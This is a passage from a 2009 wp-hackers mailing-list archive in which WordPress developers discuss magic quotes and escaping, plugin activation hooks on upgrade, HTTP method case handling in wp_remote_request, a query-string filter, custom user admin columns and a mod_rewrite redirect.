On Wed, Jul 15, 2009 at 7:42 PM, Matt Freedman<speedboxer at gmail.com> wrote:
> Actually, the quotes are (purposely) added using addslashes() in
> wp-includes/wp-db.php before inserting the data into the database.
>
> Regards,
> Matt Freedman
>
> On Wed, Jul 15, 2009 at 5:40 AM, Will
> Anderson<wp-hackers at itsananderson.com> wrote:
>> By the way, those slashes are due to Magic Quotes, a feature that will be
>> removed in PHP 5.3 and 6. If you want to guard your code against future
>> releases, or you want to distribute it to people who might have Magic Quotes
>> disabled (which can be done fairly easily), you'll probably want to check
>> whether Magic Quotes are enabled before calling stripslashes. here's a good
>> article on Magic Quotes. At the bottom of the page you'll find a code
>> snippet that should give you a good idea of how to do this check.
>>
>> http://www.tizag.com/phpT/php-magic-quotes.php
>>
>> Best,
>> Will Anderson
>> http://www.itsananderson.com/
>>
>> On Wed, Jul 15, 2009 at 5:56 AM, Daiv Mowbray <daiv at daivmowbray.com> wrote:
>>
>>>
>>> Thanx very much Matt,
>>> stripslashes() is what I needed.
>>> before display and before using in my javascript.
>>>
>>>
>>> On Jul 15, 2009, at 10:26 AM, Matt Freedman wrote:
>>>
>>> ?Use stripslashes() before displaying the option.
>>>>
>>>
>>>
>>> ----------
>>> Daiv Mowbray
>>> daiv at daivmowbray.com
>>> ----------
>>>
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> Will Anderson
>> http://www.itsananderson.com/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Matt Freedman
> http://mattfreedman.ca/
>



-- 
Matt Freedman
http://mattfreedman.ca/

From wp-hackers at itsananderson.com  Thu Jul 16 03:43:22 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Wed, 15 Jul 2009 23:43:22 -0400
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <b88434820907151943r3aea796bk47bc662cb67e1c4b@mail.gmail.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com>
	<b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com>
	<BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>
	<6dbcd2670907150540h331fec17tbf685605896bad9b@mail.gmail.com>
	<b88434820907151942l4d331079u6a8874ae13f966ca@mail.gmail.com>
	<b88434820907151943r3aea796bk47bc662cb67e1c4b@mail.gmail.com>
Message-ID: <6dbcd2670907152043oa49ec9fy47c927295b4e4cf0@mail.gmail.com>

Yes, quotes and backslashes are escaped by $wpdb->prepare before the queries
are sent to the database, this is done to avoid SQL injections. These back
slashes are interpreted as escape characters by MySQL and don't actually
make it into the database. A problem arises when both $wpdb and Magic Quotes
escape the input. Then instead of inserting [Tom\'s Bar] into your database,
you get [Tom\\\'s Bar]. In the first case, MySQL interprets the \' as a
single quote and you end up with [Tom's Bar] in your database. In the second
case, MySQL interprets the \\ as a single backslash and the \' as a single
quote. You end up with [Tom\'s Bar] in your database. Pulling this data out
and then putting it back in only compounds the problem.
This is why Magic Quotes are being deprecated. They're useful for software
that doesn't do its own escaping, but software like WordPress does, so Magic
Quotes end up being more of a pain than they're worth.

-- 
Will Anderson
http://www.itsananderson.com/

On Wed, Jul 15, 2009 at 10:43 PM, Matt Freedman <speedboxer at gmail.com>wrote:

> Rather, those quotes are escaped using addslashes(). Sorry for the error.
>
> On Wed, Jul 15, 2009 at 7:42 PM, Matt Freedman<speedboxer at gmail.com>
> wrote:
> > Actually, the quotes are (purposely) added using addslashes() in
> > wp-includes/wp-db.php before inserting the data into the database.
> >
> > Regards,
> > Matt Freedman
> >
> > On Wed, Jul 15, 2009 at 5:40 AM, Will
> > Anderson<wp-hackers at itsananderson.com> wrote:
> >> By the way, those slashes are due to Magic Quotes, a feature that will
> be
> >> removed in PHP 5.3 and 6. If you want to guard your code against future
> >> releases, or you want to distribute it to people who might have Magic
> Quotes
> >> disabled (which can be done fairly easily), you'll probably want to
> check
> >> whether Magic Quotes are enabled before calling stripslashes. here's a
> good
> >> article on Magic Quotes. At the bottom of the page you'll find a code
> >> snippet that should give you a good idea of how to do this check.
> >>
> >> http://www.tizag.com/phpT/php-magic-quotes.php
> >>
> >> Best,
> >> Will Anderson
> >> http://www.itsananderson.com/
> >>
> >> On Wed, Jul 15, 2009 at 5:56 AM, Daiv Mowbray <daiv at daivmowbray.com>
> wrote:
> >>
> >>>
> >>> Thanx very much Matt,
> >>> stripslashes() is what I needed.
> >>> before display and before using in my javascript.
> >>>
> >>>
> >>> On Jul 15, 2009, at 10:26 AM, Matt Freedman wrote:
> >>>
> >>>  Use stripslashes() before displaying the option.
> >>>>
> >>>
> >>>
> >>> ----------
> >>> Daiv Mowbray
> >>> daiv at daivmowbray.com
> >>> ----------
> >>>
> >>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >>
> >>
> >>
> >> --
> >> Will Anderson
> >> http://www.itsananderson.com/
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> >
> > --
> > Matt Freedman
> > http://mattfreedman.ca/
> >
>
>
>
> --
> Matt Freedman
> http://mattfreedman.ca/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Thu Jul 16 04:10:59 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 15 Jul 2009 23:10:59 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
Message-ID: <AD713840-A36D-4A07-904A-128229783526@striderweb.com>

My error.  I thought they were both skipped.

On Jul 15, 2009, at 11:41 AM, Jordi Canals wrote:

> The activaion hook fires on auto-update. I had to change some plugins
> because of that.
> Just it does not run on a manual update (when manually replacing the
> files by FTP).
>
> 2009/7/15 Aaron D. Campbell <aaron at xavisys.com>:
>> Are you sure about that?  It looks like the deactivation hook is  
>> silently
>> skipped, but it looks like the activation hook runs normally on an  
>> auto
>> upgrade.
>>
>> Stephen Rider wrote:
>>>
>>> That won't work for auto-updates (a plugin going from "works with  
>>> PHP 4+"
>>> to "works with PHP 5+").
>>>
>>> The activation hook does not fire during auto update.


From wp at xentek.net  Thu Jul 16 04:51:07 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 16 Jul 2009 00:51:07 -0400
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <427667db0907151904p4544e56cy1826316c0d95e1a5@mail.gmail.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
	<427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com>
	<4A5E83A5.5000407@duechiacchiere.it>
	<427667db0907151904p4544e56cy1826316c0d95e1a5@mail.gmail.com>
Message-ID: <3CF07A43-BDB4-40ED-BC3B-4249E3E01BE2@xentek.net>


On Jul 15, 2009, at 10:04 PM, Lynne Pope wrote:

> By then, we won't need WordPress as our blog posts will be getting  
> beamed
> straight from our thoughts through a subliminal wave pattern LOL.
>
> 29 years is more than a lifetime in technology.

And by then we'll be using WordPress 64-Bi (with PHP 5 :p ).

rimshot.wav,

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From dan at sproutventure.com  Thu Jul 16 07:24:41 2009
From: dan at sproutventure.com (Dan Cameron)
Date: Thu, 16 Jul 2009 00:24:41 -0700
Subject: [wp-hackers] URL Query Strings being Preserved
In-Reply-To: <7b4922320907142312h10ba02ha756ffae49268803@mail.gmail.com>
References: <4A5D6E9E.7000508@sproutventure.com>
	<7b4922320907142312h10ba02ha756ffae49268803@mail.gmail.com>
Message-ID: <4A5ED5B9.3050400@sproutventure.com>


> I wouldn't
> consider it an error, since it could just as easily be regarded as desired
> behavior.
>    

Yeah, after thinking about it for a bit I realized there's plenty of 
reasoning to have it. One main reason would be to keep querystrings that 
sort persistent when navigating through an archive ( e.g. product 
catalogs ).

I ended up writing a filter that I don't mind anyone improving on:

This way I can specify the query string that should be trimmed and 
preserving any other qs that may be needed.

add_filter('get_pagenum_link', 'my_get_pagenum_link', 1, 2);

function my_get_pagenum_link($url='',$querystring='load') {
     $url = apply_filters('myget_pagenum_link', $url);
     $result = preg_replace('/(.*)(\?|&)' . $querystring . 
'=[^&]+?(&)(.*)/i', '$1$2$4', $url . '&');
     $result = substr($result, 0, -1);

     return $result;
}

From peter.westwood at ftwr.co.uk  Thu Jul 16 08:44:00 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Thu, 16 Jul 2009 09:44:00 +0100 (BST)
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <4A5E2967.50503@mullenweg.com>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
Message-ID: <b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>

> On 7/15/2009 12:01 PM, John Blackbourn wrote:
>> Just a quick heads up for anyone who may be using the POST method with
>> the wp_remote_request() function in WordPress, you must ensure that
>> POST is written in uppercase as the cURL transport method will fail
>> otherwise (at the switch statement in WP_Http_Curl::request). Other
>> transport methods may suffer from this too, I haven't checked.
>>
>> Bit of an edge case I know but I thought I would put it out there.
>
> Worth a patch on Trac to strtoupper to protect anyone in the future.
>

Maybe.

Technically the method is case-sensitive:


RFC 2616                        HTTP/1.1                       June 1999

5.1.1 Method

   The Method  token indicates the method to be performed on the
   resource identified by the Request-URI. The method is case-sensitive.


From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.1.1247733843.16652.wp-hackers@lists.automattic.com>

-- 
Peter


From joost at yoast.com  Thu Jul 16 08:46:13 2009
From: joost at yoast.com (Joost de Valk)
Date: Thu, 16 Jul 2009 10:46:13 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <AD713840-A36D-4A07-904A-128229783526@striderweb.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>	<4A5DFD83.7000902@xavisys.com>	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
Message-ID: <4A5EE8D5.3010808@yoast.com>

Ehm, dare I say that if it's called "activation" hook, it should not be 
run during upgrades?

Stephen Rider wrote:
> My error.  I thought they were both skipped.
>
> On Jul 15, 2009, at 11:41 AM, Jordi Canals wrote:
>
>> The activaion hook fires on auto-update. I had to change some plugins
>> because of that.
>> Just it does not run on a manual update (when manually replacing the
>> files by FTP).
>>
>> 2009/7/15 Aaron D. Campbell <aaron at xavisys.com>:
>>> Are you sure about that?  It looks like the deactivation hook is 
>>> silently
>>> skipped, but it looks like the activation hook runs normally on an auto
>>> upgrade.
>>>
>>> Stephen Rider wrote:
>>>> That won't work for auto-updates (a plugin going from "works with 
>>>> PHP 4+"
>>>> to "works with PHP 5+").
>>>>
>>>> The activation hook does not fire during auto update. 
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers 

-- 
*Joost de Valk*
SEO & Web Development (Magento & WordPress)
OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - 
joost at yoast.com <mailto:joost at yoast.com>
T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
W: http://yoast.com/

From simon at sweetinteraction.com  Thu Jul 16 08:46:40 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Thu, 16 Jul 2009 09:46:40 +0100
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com> 
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
Message-ID: <77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>

On Thu, Jul 16, 2009 at 9:44 AM, Peter
Westwood<peter.westwood at ftwr.co.uk> wrote:
>> On 7/15/2009 12:01 PM, John Blackbourn wrote:
>>> Just a quick heads up for anyone who may be using the POST method with
>>> the wp_remote_request() function in WordPress, you must ensure that
>>> POST is written in uppercase as the cURL transport method will fail
>>> otherwise (at the switch statement in WP_Http_Curl::request). Other
>>> transport methods may suffer from this too, I haven't checked.
>>>
>>> Bit of an edge case I know but I thought I would put it out there.
>>
>> Worth a patch on Trac to strtoupper to protect anyone in the future.
>>
>
> Maybe.
>
> Technically the method is case-sensitive:
>

While I absolutely agree with your reading of the RFC, in this
situation there's no realistic situation I can think of where someone
would type "post" and not mean "POST".... unless I'm missing
something?

See you at the weekend!

S



---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From joost at yoast.com  Thu Jul 16 08:50:23 2009
From: joost at yoast.com (Joost de Valk)
Date: Thu, 16 Jul 2009 10:50:23 +0200
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
In-Reply-To: <45c7e0790907151246i4af8edefocf0d6c2e552d61a9@mail.gmail.com>
References: <45c7e0790907151246i4af8edefocf0d6c2e552d61a9@mail.gmail.com>
Message-ID: <4A5EE9CF.2000508@yoast.com>

Not to plug my own work (but hey, why not) my Google Analytics for 
WordPress plugin does that too:
     http://yoast.com/wordpress/google-analytics/

It has the added benefit of using # instead of ? campaign URL's when so 
configured, to prevent dupe content in the search engines.

Combine that with the uber cool new Analytics 360 plugin and a slight 
hack I described here:
     http://yoast.com/analytics360/

And you'll have rss click through analytics in your dashboard.

However that doesn't seem to be what you want, if you want to reliably 
measure how many people read your feed through a feedreader, I can only 
say one thing: forget it. FeedBurner is FAR from reliable these days.

Steve Bruner [SlipFire] wrote:
> I've used this plugin and it worked well.  Added a RSS campaign to my GA.
>
> http://wordpress.org/extend/plugins/rss-link-tagger-for-google-analytics/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

-- 
*Joost de Valk*
SEO & Web Development (Magento & WordPress)
OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - 
joost at yoast.com <mailto:joost at yoast.com>
T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
W: http://yoast.com/

From peter.westwood at ftwr.co.uk  Thu Jul 16 08:58:59 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Thu, 16 Jul 2009 09:58:59 +0100 (BST)
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
Message-ID: <3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>

> On Thu, Jul 16, 2009 at 9:44 AM, Peter
> Westwood<peter.westwood at ftwr.co.uk> wrote:
>>> On 7/15/2009 12:01 PM, John Blackbourn wrote:
>>>> Just a quick heads up for anyone who may be using the POST method with
>>>> the wp_remote_request() function in WordPress, you must ensure that
>>>> POST is written in uppercase as the cURL transport method will fail
>>>> otherwise (at the switch statement in WP_Http_Curl::request). Other
>>>> transport methods may suffer from this too, I haven't checked.
>>>>
>>>> Bit of an edge case I know but I thought I would put it out there.
>>>
>>> Worth a patch on Trac to strtoupper to protect anyone in the future.
>>>
>>
>> Maybe.
>>
>> Technically the method is case-sensitive:
>>
>
> While I absolutely agree with your reading of the RFC, in this
> situation there's no realistic situation I can think of where someone
> would type "post" and not mean "POST".... unless I'm missing
> something?
>

Agreed.

I think we need to be careful to upper-case only certain method names.

I believe this is the approach that browsers have taken for XMLHTTPRequest

-- 
Peter



From needle at haystack.co.uk  Thu Jul 16 09:04:08 2009
From: needle at haystack.co.uk (Christian Wach)
Date: Thu, 16 Jul 2009 10:04:08 +0100
Subject: [wp-hackers] URL Query Strings being Preserved
In-Reply-To: <4A5ED5B9.3050400@sproutventure.com>
References: <4A5D6E9E.7000508@sproutventure.com>
	<7b4922320907142312h10ba02ha756ffae49268803@mail.gmail.com>
	<4A5ED5B9.3050400@sproutventure.com>
Message-ID: <038847E8-33D7-43F3-80CD-10390B665133@haystack.co.uk>

Hi Dan,

On 16 Jul 2009, at 08:24, Dan Cameron wrote:

>> I wouldn't consider it an error, since it could just as easily be  
>> regarded as desired behavior.
>
> Yeah, after thinking about it for a bit I realized there's plenty of  
> reasoning to have it. One main reason would be to keep querystrings  
> that sort persistent when navigating through an archive ( e.g.  
> product catalogs ).
>
> I ended up writing a filter that I don't mind anyone improving on:
>
> This way I can specify the query string that should be trimmed and  
> preserving any other qs that may be needed.

I may be missing something here, but isn't this what  
remove_query_arg() already does? :)

Cheers,

Christian


From scribu at gmail.com  Thu Jul 16 10:04:55 2009
From: scribu at gmail.com (scribu)
Date: Thu, 16 Jul 2009 13:04:55 +0300
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5EE8D5.3010808@yoast.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
	<4A5EE8D5.3010808@yoast.com>
Message-ID: <349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>

On Thu, Jul 16, 2009 at 11:46 AM, Joost de Valk <joost at yoast.com> wrote:

> Ehm, dare I say that if it's called "activation" hook, it should not be run
> during upgrades?


During an upgrade, the plugin is deactivated and then reactivated, so it
makes sense.

-- 
http://scribu.net

From johnbillion+wp at gmail.com  Thu Jul 16 13:42:47 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Thu, 16 Jul 2009 14:42:47 +0100
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
Message-ID: <1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>

2009/7/16 Peter Westwood <peter.westwood at ftwr.co.uk>:
>
> Agreed.
>
> I think we need to be careful to upper-case only certain method names.
>
> I believe this is the approach that browsers have taken for XMLHTTPRequest

The problem in this scenario is that when a call to wp_http_request()
contained the post method in lower case, it wasn't triggering the
right case in a switch statement as the switch was checking for POST.
(Around line 1280 of wp-includes/http.php in the case of cURL.)

Maybe the fix is actually to add two cases for each method in the
switch statements. Eg.

case 'HEAD':
case 'head':
 ....

case 'POST':
case 'post':
 ....

By not explicitly uppercasing the method you then allow for methods
(other than post and head in this situation) that may actually be case
sensitive.

Is this overengineering?

John

From aaron at xavisys.com  Thu Jul 16 16:11:34 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Thu, 16 Jul 2009 09:11:34 -0700
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>	<4A5DFD83.7000902@xavisys.com>	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>	<4A5EE8D5.3010808@yoast.com>
	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
Message-ID: <4A5F5136.7040100@xavisys.com>

I think it would be nice to know if it's an upgrade (maybe an extra 
parameter to the activation hook), but it's definitely nice that it 
runs.  Especially for plugins that have database tables and may want to 
adjust those tables for the new version.

scribu wrote:
> On Thu, Jul 16, 2009 at 11:46 AM, Joost de Valk <joost at yoast.com> wrote:
>
>   
>> Ehm, dare I say that if it's called "activation" hook, it should not be run
>> during upgrades?
>>     
>
>
> During an upgrade, the plugin is deactivated and then reactivated, so it
> makes sense.
>   


From mrbrog at gmail.com  Thu Jul 16 17:05:15 2009
From: mrbrog at gmail.com (Claudio Simeone)
Date: Thu, 16 Jul 2009 19:05:15 +0200
Subject: [wp-hackers] row output on wp-admin/users.php
In-Reply-To: <CB34EBF7-7B67-4B3B-B30D-98E6EC24C4CE@sproutventure.com>
References: <F4123DB7-8E29-4FBE-B2D7-8B45D5289E38@sproutventure.com> 
	<3CC2974E-7B0A-4C7C-8042-622698BB70F9@striderweb.com>
	<68528DBC-5C7A-4E18-B3A9-242A34A49EB7@sproutventure.com> 
	<CB34EBF7-7B67-4B3B-B30D-98E6EC24C4CE@sproutventure.com>
Message-ID: <c41cda880907161005l40d3caedsfd0cebe1f4a35f22@mail.gmail.com>

2009/6/12 Dan Cameron <dan at sproutventure.com>:
>> manage_users_custom_column
>
> I should mention that function only works in WP 2.8, looks like someone ran
> into the same problem and fixed it in a more elegant solution.


Hi,

seems that this hook does not work good in 2.8.1. I'm trying to add a
custom column with these functions:

add_filter('manage_users_columns', 'my_user_cols_columns'); // this works
add_action('manage_users_custom_column', my_user_cols_cc'); // this not

function my_user_cols_columns($defaults) {
    $defaults['courses'] = 'My Column';
    return $defaults;
}

function my_user_cols_cc($column, $user) {
if( $column == 'courses' ) {
   	echo '=>'.$user;
    }
}

but it seems that the function my_user_cols_cc does not receive the
arguments. Or at least it does not work same as the post columns.
Googling around, I found this post:
http://blog.5ubliminal.com/posts/incoherency-in-wordpress-custom-columns-actions-vs-filters/

So my question is: the issues explained in this post, have been fixed?
If i try to apply this patch to wp-admin/includes/template.php

ob_start(); // Start ob
do_action('manage_users_custom_column', $column_name, $user_object->ID);
$res = ob_get_contents(); // Get ob contents
ob_end_clean(); // Clean ob
$r .= $res; // Append captured output

it passes the column_name, but not the user id. The same as if i modify:

$r .= apply_filters('manage_users_custom_column', '',$column_name,
$user_object->ID);
to
$r .= apply_filters('manage_users_custom_column', $column_name,
$user_object->ID);

is this a bug or I did not understand good how this hook works?

thanks in advance
CLS

From wp-hackers at itsananderson.com  Thu Jul 16 18:31:22 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Thu, 16 Jul 2009 14:31:22 -0400
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5F5136.7040100@xavisys.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
	<4A5EE8D5.3010808@yoast.com>
	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
	<4A5F5136.7040100@xavisys.com>
Message-ID: <6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>

While it would be convenient to have an extra parameter or something, I
think the idea was to simulate the "correct" manual upgrade procedure. That
is, disable the plugin, upload the update, then enable it again. This is
essentially what happens when you use the auto-upgrader, except that you
don't have to do any of it manually.
One possible way to keep track of updates, first time installs, and simple
disable/enable actions is to use an option that contains the current version
number. Then when the plugin is enabled you check the version in the
database. If the option doesn't exist, the plugin has most likely just been
installed. If it exists, but is an older version, an update has most likely
been done. If it's the same version, then the user probably just disabled
the plugin and then enabled it again without making any changes.
I can't see any issues with what I just described, but if I'm off base in
any way, by all means, fire away!


-- 
Will Anderson
http://www.itsananderson.com/



On Thu, Jul 16, 2009 at 12:11 PM, Aaron D. Campbell <aaron at xavisys.com>wrote:

> I think it would be nice to know if it's an upgrade (maybe an extra
> parameter to the activation hook), but it's definitely nice that it runs.
>  Especially for plugins that have database tables and may want to adjust
> those tables for the new version.
>
> scribu wrote:
>
>> On Thu, Jul 16, 2009 at 11:46 AM, Joost de Valk <joost at yoast.com> wrote:
>>
>>
>>
>>> Ehm, dare I say that if it's called "activation" hook, it should not be
>>> run
>>> during upgrades?
>>>
>>>
>>
>>
>> During an upgrade, the plugin is deactivated and then reactivated, so it
>> makes sense.
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From awgandrews at gmail.com  Thu Jul 16 22:08:19 2009
From: awgandrews at gmail.com (Alex Andrews)
Date: Thu, 16 Jul 2009 23:08:19 +0100
Subject: [wp-hackers] My Plugin Breaks Posting
Message-ID: <e9f3ce460907161508h1992bec6sd7f7bf7d981c9fe9@mail.gmail.com>

Hey all,

The plugin I am developing breaks posting. I have little idea how so I
am wondering if someone has any idea what it may be. Turned off adding
a new post works fine. Turned off I get the following error message:

Your attempt to edit this post: ?hdfghsrhdgf? has failed.

Please try again.

I'm baffled to what could be the reason for this. I've ensured that no
variable conflicts with the normal functions of Wordpress, the only
thing I can think of is something in the admin functions.

http://github.com/recordsonribs/ribcage/tree/alex-working for the
code. I have an idea it might be this change -
http://github.com/recordsonribs/ribcage/commit/45588db65aa9132e277dbfaa780ba0950115a6ec

Very odd - tearing my hair out here!

Thanks very much

All the best

Alex

From bryanharley at gmail.com  Thu Jul 16 23:17:43 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Thu, 16 Jul 2009 16:17:43 -0700
Subject: [wp-hackers] mod_rewrite help
Message-ID: <58410e2e0907161617y4838c92fjc2dc244b207c7e69@mail.gmail.com>

I have one type of URL that I want to 301 redirect to another.  Can
anyone help me write the mod_rewrite rule that can accomplish this?

http://www.domain.com/category/postid-post-name.html

http://www.domain.com/post-name/

From james at om4.com.au  Thu Jul 16 23:36:22 2009
From: james at om4.com.au (James Collins)
Date: Fri, 17 Jul 2009 09:36:22 +1000
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <58410e2e0907161617y4838c92fjc2dc244b207c7e69@mail.gmail.com>
References: <58410e2e0907161617y4838c92fjc2dc244b207c7e69@mail.gmail.com>
Message-ID: <bcf8d3150907161636n58575ea8tb2e74d03329193fa@mail.gmail.com>

Hi Bryan,
I would use the redirection plugin (
http://wordpress.org/extend/plugins/redirection/) to achieve this.

Much easier than modifying your .htaccess file.

Regards,

James Collins

OM4 - Website Design and Development
OM4.com.au | OM4Tourism.com



2009/7/17 Bryan Harley <bryanharley at gmail.com>

> I have one type of URL that I want to 301 redirect to another.  Can
> anyone help me write the mod_rewrite rule that can accomplish this?
>
> http://www.domain.com/category/postid-post-name.html
>
> http://www.domain.com/post-name/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jcanals at alkivia.com  Fri Jul 17 00:04:03 2009
From: jcanals at alkivia.com (Jordi Canals)
Date: Fri, 17 Jul 2009 02:04:03 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
	<4A5EE8D5.3010808@yoast.com>
	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
	<4A5F5136.7040100@xavisys.com>
	<6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>
Message-ID: <394db23a0907161704q6956513cwcbb130817d1cf96e@mail.gmail.com>

Will,

What you described is exactly what I do on my plugins. I think is the
best way to track plugin updates, changes and activation/deactivation.
Also, doing this way, you can track if the plugin was manually updated
(As the plugin version will change).

Regards,

-- 
Jordi Canals [Txanny]
http://alkivia.org



2009/7/16 Will Anderson <wp-hackers at itsananderson.com>:
